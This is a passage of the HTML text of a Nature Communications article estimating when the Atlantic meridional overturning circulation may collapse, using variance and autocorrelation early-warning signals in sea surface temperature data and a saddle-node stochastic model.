Jackson, L. &amp; Andrews, M. The effect of model bias on Atlantic freshwater transport and implications for AMOC bi-stability. Tellus A: Dyn. Meteorol. Oceanogr. 69, 1299910 (2017)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR10" id="ref-link-section-d21713702e370">10</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 11" title="Rahmstorf, S. et al. Exceptional twentieth-century slowdown in Atlantic Ocean overturning circulation. Nat. Clim. Change 5, 475‚Äì480 (2015)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR11" id="ref-link-section-d21713702e373">11</a></sup>. Based on the CMIP5 generation of models, the AR6 IPCC report quotes a collapse in the 21st century to be very unlikely (medium confidence)<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 12" title="Masson-Delmotte, V. et al. IPCC, 2021: Climate Change 2021: The Physical Science Basis. Contribution of Working Group I to the Sixth Assessment Report of the Intergovernmental Panel on Climate Change (Cambridge University Press, 2021)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR12" id="ref-link-section-d21713702e378">12</a></sup>. Among CMIP6 models, there is a larger spread in the AMOC response to warming scenarios, thus an increased uncertainty in the assessment of a future collapse<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 13" title="Gong, X., Liu, H., Wang, F. &amp; Heuz√©, C. Of Atlantic meridional overturning circulation in the CMIP6 project. Deep Sea Res. Part II: Top. Stud. Oceanogr. 206, 105193 (2022)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR13" id="ref-link-section-d21713702e382">13</a></sup>. There are, however, model biases toward overestimated stability of the AMOC, both from tuning to the historic climate record<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 14" title="Hofmann, M. &amp; Rahmstorf, S. On the stability of the Atlantic meridional overturning circulation. Proc. Natl Acad. Sci. USA 106, 20584‚Äì20589 (2009)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR14" id="ref-link-section-d21713702e386">14</a></sup>, poor representation of the deep water formation<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 15" title="Heuz√©, C. North Atlantic deep water formation and AMOC in CMIP5 models. Ocean Sci. 13, 609‚Äì622 (2017)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR15" id="ref-link-section-d21713702e390">15</a></sup>, salinity and glacial runoff<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 16" title="Liu, W., Xie, S.-P., Liu, Z. &amp; Zhu, J. Overlooked possibility of a collapsed Atlantic meridional overturning circulation in warming climate. Sci. Adv. 3, e1601666 (2017)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR16" id="ref-link-section-d21713702e394">16</a></sup>.</p><p>When complex systems, such as the overturning circulation, undergo critical transitions by changing a control parameter <i>Œª</i> through a critical value <i>Œª</i><sub><i>c</i></sub>, a structural change in the dynamics happens. The previously statistically stable state ceases to exist and the system moves to a different statistically stable state. The system undergoes a bifurcation, which for <i>Œª</i> sufficiently close to <i>Œª</i><sub><i>c</i></sub> can happen in a limited number of ways rather independent from the details in the governing dynamics<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 17" title="Guckenheimer, J. &amp; Holmes, P. Nonlinear Oscillations, Dynamical Systems, and Bifurcations of Vector Fields (Springer, 1986)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR17" id="ref-link-section-d21713702e420">17</a></sup>. Besides a decline of the AMOC before the critical transition, there are early-warning signals (EWSs), statistical quantities, which also change before the tipping happens. These are critical slowing down (increased autocorrelation) and, from the Fluctuation-Dissipation Theorem, increased variance in the signal<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" title="Kubo, R. The fluctuation-dissipation theorem. Rep. Prog. Phys. 29, 255‚Äì284 (1966)." href="#ref-CR18" id="ref-link-section-d21713702e424">18</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" title="Ditlevsen, P. D. &amp; Johnsen, S. Tipping points: early warning and wishful thinking. Geophys. Res. Lett. 37, L19703 (2010)." href="#ref-CR19" id="ref-link-section-d21713702e424_1">19</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 20" title="Boulton, C., Allison, L. &amp; Lenton, T. Early warning signals of Atlantic meridional overturning circulation collapse in a fully coupled climate model. Nat. Commun. 5, 5752 (2014)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR20" id="ref-link-section-d21713702e427">20</a></sup>. The latter is also termed ‚Äúloss of resilience‚Äù, especially in the context of ecological collapse<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 21" title="Scheffer, M. et al. Early-warning signals for critical transitions. Nature 461, 53‚Äì59 (2009)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR21" id="ref-link-section-d21713702e431">21</a></sup>. The two EWSs are statistical equilibrium concepts. Thus, using them as actual predictors of a forthcoming transition relies on the assumption of quasi-stationary dynamics.</p><p>The AMOC has only been monitored continuously since 2004 through combined measurements from moored instruments, induced electrical currents in submarine cables and satellite surface measurements<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 22" title="Smeed, D. A. et al. Observed decline of the Atlantic meridional overturning circulation 2004-2012. Ocean Sci. 10, 29‚Äì38 (2014)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR22" id="ref-link-section-d21713702e438">22</a></sup>. Over the period 2004‚Äì2012, a decline in the AMOC has been observed, but longer records are necessary to assess the significance. For that, careful fingerprinting techniques have been applied to longer records of sea surface temperature (SST), which, backed by a survey of a large ensemble of climate model simulations, have found the SST in the Subpolar gyre (SG) region of the North Atlantic (area marked with a black contour in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig1">1</a>a) to contain an optimal fingerprint of the strength of the AMOC<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" title="Caesar, L., Rahmstorf, S., Robinson, A., Feulner, G. &amp; Saba, V. Observed fingerprint of a weakening Atlantic ocean overturning circulation. Nature 552, 191‚Äì196 (2018)." href="#ref-CR23" id="ref-link-section-d21713702e445">23</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" title="Jackson, L. C. &amp; Wood, R. A. Fingerprints for early detection of changes in the AMOC. J. Clim. 33, 7027 ‚Äì 7044 (2020)." href="#ref-CR24" id="ref-link-section-d21713702e445_1">24</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 25" title="Latif, M. Reconstructing, monitoring, and predicting multidecadal-scale changes in the North Atlantic thermohaline circulation with sea surface temperature. J. Clim. 17, 1605‚Äì1614 (2004)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR25" id="ref-link-section-d21713702e448">25</a></sup>.</p><div data-test="figure" data-container-section="figure" id="figure-1" data-title="The Atlantic meridional overturning circulation (AMOC) fingerprint, sea surface temperature (SST) and global mean (GM)."><figure><figcaption><b id="Fig1" data-test="figure-caption-text">Fig. 1: The Atlantic meridional overturning circulation (AMOC) fingerprint, sea surface temperature (SST) and global mean (GM).</b></figcaption><div><div><a data-test="img-link" data-track="click" data-track-label="image" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/1" rel="nofollow"><picture><source type="image/webp" srcset="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig1_HTML.png?as=webp"><img aria-describedby="Fig1" src="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig1_HTML.png" alt="figure 1" loading="lazy" width="685" height="1161"></picture></a></div><p><b>a</b> Subpolar gyre (SG) region (black contour) on top of the Hadley Centre Sea Ice and Sea Surface Temperature data set (HadISST) SST reconstruction for December 2020. The SG region SST has been identified as an AMOC fingerprint<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 23" title="Caesar, L., Rahmstorf, S., Robinson, A., Feulner, G. &amp; Saba, V. Observed fingerprint of a weakening Atlantic ocean overturning circulation. Nature 552, 191‚Äì196 (2018)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR23" id="ref-link-section-d21713702e466">23</a></sup>. <b>b</b> Full monthly record of the SG SST together with the global mean (GM) SST. <b>c</b>, <b>d</b> SG and GM anomalies, which are the records subtracted the monthly mean over the full record. <b>e</b> AMOC fingerprint proxy, which is here defined as the SG anomaly minus twice the GM anomaly, compensating for the polar amplified global warming.</p></div><p><a data-test="article-link" data-track="click" data-track-label="button" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/1" data-track-dest="link:Figure1 Full size image" aria-label="Full size image figure 1" rel="nofollow"><span>Full size image</span></a></p></figure></div><p>Figure&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig1">1</a>b shows the SG and the GM SSTs obtained from the Hadley Centre Sea Ice and Sea Surface Temperature data set (HadISST)<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 26" title="Rayner, N. A. et al. Global analyses of sea surface temperature, sea ice, and night marine air temperature since the late nineteenth century. J. Geophys. Res. 108, 4407 (2003)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR26" id="ref-link-section-d21713702e496">26</a></sup>. Figure&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig1">1</a>c shows the SG anomaly, and Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig1">1</a>d shows the GM anomaly with a clear global warming trend in the last half of the record. The AMOC fingerprint for the period 1870‚Äì2020 is shown in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig1">1</a>e. This is the basis for the analysis. It has been reported<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 11" title="Rahmstorf, S. et al. Exceptional twentieth-century slowdown in Atlantic Ocean overturning circulation. Nat. Clim. Change 5, 475‚Äì480 (2015)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR11" id="ref-link-section-d21713702e510">11</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 27" title="Boers, N. Observation-based early-warning signals for a collapse of the Atlantic meridional overturning circulation. Nat. Clim. Change 11, 680‚Äì688 (2021)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR27" id="ref-link-section-d21713702e513">27</a></sup> that this and similar AMOC indices show significant trends in the mean, the variance and the autocorrelation, indicating early warning of a shutdown of the AMOC. However, a trend in the EWSs within a limited period of observation could be a random fluctuation within steady-state statistics. Thus, for a robust assessment of the shutdown, it is necessary to establish a statistical confidence level for the change above the natural fluctuations. This is not easily done given only one, the observed realization of the approach to the transition. Here we establish such a measure of the confidence for the variance and autocorrelation and demonstrate that variance is the more reliable of the two. A further contribution is an estimator of not only whether a transition is approaching but also the time when the critical transition is expected to occur. The strategy is to infer the evolution of the AMOC solely on observed changes in mean, variance and autocorrelation. The typical choice of control parameter is the flux of freshwater into the North Atlantic. River runoff, Greenland ice melt and export from the Arctic Ocean are not well constrained<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 28" title="Yang, Q. et al. Recent increases in Arctic freshwater flux affects Labrador Sea convection and Atlantic overturning circulation. Nat. Commun. 7, 10525 (2016)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR28" id="ref-link-section-d21713702e517">28</a></sup>; thus, we do not assume the control parameter known. Boers<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 27" title="Boers, N. Observation-based early-warning signals for a collapse of the Atlantic meridional overturning circulation. Nat. Clim. Change 11, 680‚Äì688 (2021)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR27" id="ref-link-section-d21713702e521">27</a></sup> assumes the global mean temperature <i>T</i> to represent the control parameter. Although <i>T</i> has increased since ~1920 (Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig1">1</a>d), the increase is not quite linear with time. All we assume here is that the AMOC is in an equilibrium state prior to a change toward the transition. The simplest uninformed assumption is that the change is sufficiently slow and that the control parameter approaches the (unknown) critical value linearly with time. This assumption is confirmed by a close fit of the estimated model&nbsp;to the observed AMOC fingerprint. Although we make no explicit assumptions, the primary driver of climate change, the logarithm of the atmospheric CO<sub>2</sub> concentration, does, in fact, increase close to linearly with time in the industrial period<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 29" title="Keeling, C. D. et al. Atmospheric CO2 and 13CO2 exchange with the terrestrial biosphere and oceans from 1978 to 2000: observations and carbon cycle implications. A History of Atmospheric CO2 and Its Effects on Plants, Animals, and Ecosystems (eds Ehleringer, J. R. et al.) (Springer, 2005)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR29" id="ref-link-section-d21713702e537">29</a></sup>. Our results are robust without making specific assumptions regarding the driver of the AMOC.</p><p>In this work, we show that a transition of the AMOC is most likely to occur around 2025-2095&nbsp; (95% confidence interval).</p></div></div><div id="Sec2-section" data-title="Results"><h2 id="Sec2">Results</h2><div id="Sec2-content"><h3 id="Sec3">Modeling and detecting the critical transition</h3><p>Denote the observed AMOC fingerprint by <i>x</i>(<i>t</i>) (Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig1">1</a>e). We model it by a stochastic process <i>X</i><sub><i>t</i></sub>, which, depending on a control parameter <i>Œª</i>‚Äâ&lt;‚Äâ0, is at risk of undergoing a critical transition through a saddle-node bifurcation for <i>Œª</i>‚Äâ=‚Äâ<i>Œª</i><sub><i>c</i></sub>‚Äâ=‚Äâ0. The system is initially in a statistically stable state, i.e., it follows some stationary distribution with constant <i>Œª</i>‚Äâ=‚Äâ<i>Œª</i><sub>0</sub>. We are uninformed about the dynamics governing the evolution of <i>X</i><sub><i>t</i></sub> but can assume effective dynamics, which, with <i>Œª</i> sufficiently close to the critical value <i>Œª</i><sub><i>c</i></sub>‚Äâ=‚Äâ0, can be described by the stochastic differential equation (SDE):</p><div id="Equ1"><p><span>$$d{X}_{t}=-(A{({X}_{t}-m)}^{2}+\lambda )dt+\sigma d{B}_{t},$$</span></p><p>
                    (1)
                </p></div><p>where <span>\(m=\mu -\sqrt{|\lambda|/A}\)</span> and <i>Œº</i> is the stable fixed point of the drift, <i>A</i> is a time scale parameter, <i>B</i><sub><i>t</i></sub> is a Brownian motion and <i>œÉ</i><sup>2</sup> scales the variance. Disregarding the noise, this is the normal form of the co-dimension one saddle-node bifurcation<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 17" title="Guckenheimer, J. &amp; Holmes, P. Nonlinear Oscillations, Dynamical Systems, and Bifurcations of Vector Fields (Springer, 1986)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR17" id="ref-link-section-d21713702e787">17</a></sup> (see ‚ÄúMethods‚Äù). The square-root dependence of the stable state: <span>\(\mu -m \sim \sqrt{{\lambda }_{c}-\lambda }\)</span> is the main signature of a saddle-node bifurcation. It is observed for the AMOC shutdown in ocean-only models as well as in coupled models, see Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig2">2</a>, in strong support of Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>) for the AMOC.</p><div data-test="figure" data-container-section="figure" id="figure-2" data-title="Steady state curves from climate model simulations of the North Atlantic Deep Water (NADW), with a very slowly changing control parameter (freshwater forcing)."><figure><figcaption><b id="Fig2" data-test="figure-caption-text">Fig. 2: Steady state curves from climate model simulations of the North Atlantic Deep Water (NADW), with a very slowly changing control parameter (freshwater forcing).</b></figcaption><div><div><a data-test="img-link" data-track="click" data-track-label="image" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/2" rel="nofollow"><picture><source type="image/webp" srcset="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig2_HTML.png?as=webp"><img aria-describedby="Fig2" src="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig2_HTML.png" alt="figure 2" loading="lazy" width="685" height="609"></picture></a></div><p>Top panel shows ocean-only models, while bottom panel shows atmosphere-ocean models. The curves are, even away from the transition, surprisingly well fitted by Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>) (black thin curves). The bifurcation points are indicated with black circles. Note that for some models, the transition happens before the critical point, as should be expected from noise-induced transitions. The colored circles show the present-day conditions for the different models. Adapted from Rahmstorf et al.<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 34" title="Rahmstorf, S. et al. Thermohaline circulation hysteresis: a model intercomparison. Geophys. Res. Lett. 32, L23605 (2005)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR34" id="ref-link-section-d21713702e861">34</a></sup>.</p></div><p><a data-test="article-link" data-track="click" data-track-label="button" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/2" data-track-dest="link:Figure2 Full size image" aria-label="Full size image figure 2" rel="nofollow"><span>Full size image</span></a></p></figure></div><p>At time <i>t</i><sub>0</sub>, <i>Œª</i>(<i>t</i>) begins to change linearly toward <i>Œª</i><sub><i>c</i></sub>‚Äâ=‚Äâ<i>Œª</i>(<i>t</i><sub><i>c</i></sub>)‚Äâ=‚Äâ0:</p><div id="Equ2"><p><span>$$\lambda (t)={\lambda }_{0}(1-{{\Theta }}[t-{t}_{0}](t-{t}_{0})/{\tau }_{r}),$$</span></p><p>
                    (2)
                </p></div><p>where Œò[<i>t</i>] is the Heaviside function and <i>œÑ</i><sub><i>r</i></sub>‚Äâ=‚Äâ<i>t</i><sub><i>c</i></sub>‚Äâ‚àí‚Äâ<i>t</i><sub>0</sub>‚Äâ&gt;‚Äâ0 is the ramping time up to time <i>t</i><sub><i>c</i></sub>, where the transition eventually will occur. Time <i>t</i><sub><i>c</i></sub> is denoted the tipping time; however, an actual tipping can happen earlier than&nbsp;<i>t</i><sub><i>c</i></sub>&nbsp;due to a noise-induced tipping. As the transition is approached, the risk of noise-induced tipping (n-tipping) prior to <i>t</i><sub><i>c</i></sub> is increasing and, at some point, making the EWSs irrelevant for predicting the tipping. The probability for n-tipping can, in the small noise limit, be calculated in closed form, <span>\(P(t,\lambda )=1-\exp (-t/{\tau }_{n}(\lambda ))\)</span>, with mean waiting time <span>\({\tau }_{n}(\lambda )=(\pi /\sqrt{|\lambda|})\exp (8|\lambda {|}^{3/2}/3{\sigma }^{2})\)</span> (see ‚ÄúMethods‚Äù).</p><p>The mean and variance are calculated from the observations as the control parameter <i>Œª</i>(<i>t</i>) is possibly changing. These EWSs are inherently equilibrium concepts and statistical; thus, a time window, <i>T</i><sub><i>w</i></sub>, of a certain size is required for a reliable estimate. As the transition is approached, the differences between the EWSs and the pre-ramping values of the variance and autocorrelation (baseline) increase; thus, a shorter window <i>T</i><sub><i>w</i></sub> is required for detecting a difference. Conversely, close to the transition critical slowing down decreases the number of independent points within a window, thus calling for a larger window for reliable detection. Within a short enough window, [<i>t</i>‚Äâ‚àí‚Äâ<i>T</i><sub><i>w</i></sub>/2,‚Äâ<i>t</i>‚Äâ+‚Äâ<i>T</i><sub><i>w</i></sub>/2], we may assume <i>Œª</i>(<i>t</i>) to be constant and the noise small enough so that the process (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>) for given <i>Œª</i> is well approximated by a linear SDE, the Ornstein‚ÄìUhlenbeck process<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 30" title="Hasselmann, K. Stochastic climate models. Tellus 28, 473‚Äì485 (1976)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR30" id="ref-link-section-d21713702e1347">30</a></sup>. A Taylor expansion around the&nbsp;fixed point <i>Œº</i>(<i>Œª</i>) yields the approximation</p><div id="Equ3"><p><span>$$d{X}_{t}\approx -\alpha (\lambda )({X}_{t}-\mu (\lambda ))dt+\sigma d{B}_{t}$$</span></p><p>
                    (3)
                </p></div><p>where <span>\(\mu (\lambda )=m+\sqrt{|\lambda|/A}\)</span> and <span>\(\alpha (\lambda )=2\sqrt{A|\lambda|}\)</span> is the inverse correlation time. For fixed <i>Œª</i>, the process is stationary, with mean <i>Œº</i>, variance <i>Œ≥</i><sup>2</sup>‚Äâ=‚Äâ<i>œÉ</i><sup>2</sup>/2<i>Œ±</i> and one-lag autocorrelation <span>\(\rho=\exp (-\alpha {{\Delta }}t)\)</span> with step size Œî<i>t</i>‚Äâ=‚Äâ1 month. As <i>Œª</i>(<i>t</i>) increases, <i>Œ±</i> decreases, and thus variance and autocorrelation increase. From <i>Œº</i>, <i>Œ≥</i><sup>2</sup> and <i>œÅ</i> the parameters of Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>) are determined: <span>\(\alpha=-\log \rho /{{\Delta }}t\)</span>, <i>œÉ</i><sup>2</sup>‚Äâ=‚Äâ2<i>Œ±</i><i>Œ≥</i><sup>2</sup>, <i>A</i>‚Äâ=‚Äâ<i>Œ±</i>/2(<i>Œº</i>‚Äâ‚àí‚Äâ<i>m</i>) and <span>\(\lambda={({\sigma }^{2}/4{\gamma }^{2})}^{2}/A\)</span>. Closed form estimators for <i>Œº</i>,‚Äâ<i>Œ≥</i><sup>2</sup> and <i>œÅ</i> are obtained from the observed time series within a running window by maximum likelihood estimation (MLE) (Supplementary text&nbsp;<a data-track="click" data-track-label="link" data-track-action="supplementary material anchor" href="https://www.nature.com/articles/s41467-023-39810-w#MOESM1">S1</a>, see also ref. <sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 31" title="Ditlevsen, S., Cencerrado Rubio, A. &amp; Lansky, P. Transient dynamics of Pearson diffusions facilitates estimation of rate parameters. Commun. Nonlinear Sci. Numer. Simul. 82, 105034 (2020)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR31" id="ref-link-section-d21713702e1813">31</a></sup>).</p><p>The uncertainty is expressed through the variances of the estimators <span>\({\hat{\gamma }}^{2}\)</span> and <span>\(\hat{\rho }\)</span> obtained from the observations within a time window <i>T</i><sub><i>w</i></sub>. The hats indicate that they are estimators and thus stochastic variables with variances around the true values. Detection of an EWS at some chosen confidence level <i>q</i> (such as 95 or 99%) requires one of the estimates <span>\({\hat{\gamma }}^{2}\)</span> or <span>\(\hat{\rho }\)</span> for a given window to be statistically different from the baseline values <span>\({\hat{\gamma }}_{0}^{2}\)</span> or <span>\({\hat{\rho }}_{0}\)</span>, which depend on the window size as well as how different the EWSs are from their baseline values.</p><h3 id="Sec4">Time scales in early-warning signals</h3><p>The detection of a forthcoming transition using statistical measures involves several time scales. The primary internal time scale is the autocorrelation time, <i>t</i><sub><i>a</i><i>c</i></sub>, in the steady state. The ramping time <i>œÑ</i><sub><i>r</i></sub> over which the control parameter changes from the steady state value to the critical value sets an external time scale. For given <i>Œ±</i>(<i>Œª</i>) and <i>q</i>-percentile, the required time window <i>T</i><sub><i>w</i></sub>(<i>q</i>,‚Äâ<i>Œ±</i>) to detect a change from baseline in EWSs at the given confidence level <i>q</i> is given in the closed form in the next section (Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ7">7</a>) for variance and Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ8">8</a>) for autocorrelation). The approach to the collapse and the involved time scales are schematically summarized in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig3">3</a>, while they are calculated in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig4">4</a>a, where the required window size <i>T</i><sub><i>w</i></sub> at the 95% confidence level is plotted as a function of <i>Œª</i> for the variance (red curve) and autocorrelation (yellow curve). These are plotted together with the mean waiting time for n-tipping, <i>t</i><sub><i>n</i><i>o</i><i>i</i><i>s</i><i>e</i></sub>, (blue curve). With <i>T</i><sub><i>w</i></sub>‚Äâ=‚Äâ50 years, increased variance can only be detected after the time when <i>Œª</i>(<i>t</i>)‚Äâ‚âà‚Äâ‚àí1.2 (crossing of red and red-dashed curves). At that time, a window of approximately 75 years is required to detect an increase in autocorrelation, making variance the better EWS of the two. When <i>Œª</i>‚Äâ‚âà‚Äâ‚àí0.4, the mean waiting time for n-tipping is smaller than the data window size. Thus, the increased variance can be used as a reliable EWS in the range ‚àí1.2‚Äâ&lt;‚Äâ<i>Œª</i>(<i>t</i>)‚Äâ&lt;‚Äâ‚àí0.4, indicated by the green band. How timely an early warning this is depends on the speed at which <i>Œª</i>(<i>t</i>) is changing from <i>Œª</i><sub>0</sub> to <i>Œª</i><sub><i>c</i></sub>, i.e., the ramping time <i>œÑ</i><sub><i>r</i></sub>. A set of 1000 realizations has been simulated with <i>Œª</i><sub>0</sub>‚Äâ=‚Äâ‚àí2.82 and <i>œÑ</i><sub><i>r</i></sub>‚Äâ=‚Äâ140 years, indicated by the time labels on top of Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig4">4</a>a. Ten of these realizations are shown in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig4">4</a>b on top of the stable and unstable branches of fixed points of model (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>) (the bifurcation diagram). Figure&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig4">4</a>c (d) shows the variance (autocorrelation) calculated from the realizations within a running 50-year window (shown in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig4">4</a>c). The solid black line is the baseline value for <i>Œª</i>‚Äâ=‚Äâ<i>Œª</i><sub>0</sub>, while the solid blue line is the increasing value for <i>Œª</i>‚Äâ=‚Äâ<i>Œª</i>(<i>t</i>). The calculated 95% confidence level for the measurement of the EWS within the running window is shown by the dashed black and blue lines, respectively. The corresponding light blue curves are obtained numerically from the 1000 realizations. The green band in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig4">4</a>c corresponds to the green band in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig4">4</a>a and shows where early warning is possible in this case.</p><div data-test="figure" data-container-section="figure" id="figure-3" data-title="Illustration of the transition and the time scales involved."><figure><figcaption><b id="Fig3" data-test="figure-caption-text">Fig. 3: Illustration of the transition and the time scales involved.</b></figcaption><div><div><a data-test="img-link" data-track="click" data-track-label="image" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/3" rel="nofollow"><picture><source type="image/webp" srcset="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig3_HTML.png?as=webp"><img aria-describedby="Fig3" src="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig3_HTML.png" alt="figure 3" loading="lazy" width="685" height="486"></picture></a></div><p><b>a</b> Bifurcation diagram, the blue curve is the stable state (mean), <i>Œº</i>, and the dashed red curve is the unstable branch representing the edge state, <i>x</i><sub><i>e</i></sub>, both as functions of the control parameter <i>Œª</i>. At <i>Œª</i><sub><i>c</i></sub> the system has a saddle-node bifurcation. <b>b</b> Linear ramping (Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ2">2</a>)), where the system resides in a stationary state with <i>Œª</i>‚Äâ=‚Äâ<i>Œª</i><sub>0</sub> until time <i>t</i><sub>0</sub>, from where <i>Œª</i> increases linearly with time and reach the critical value <i>Œª</i><sub><i>c</i></sub> at time <i>t</i><sub><i>c</i></sub>. <b>c</b> Effective dynamics (Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>)) for <i>Œª</i>‚Äâ=‚Äâ<i>Œª</i><sub>0</sub> indicated by the potential <i>U</i>(<i>x</i>)‚Äâ=‚Äâ<i>A</i>(<i>x</i>‚àí<i>m</i>)<sup>3</sup>/3‚Äâ+‚Äâ<i>Œª</i><i>x</i> (yellow) along the same color dashed 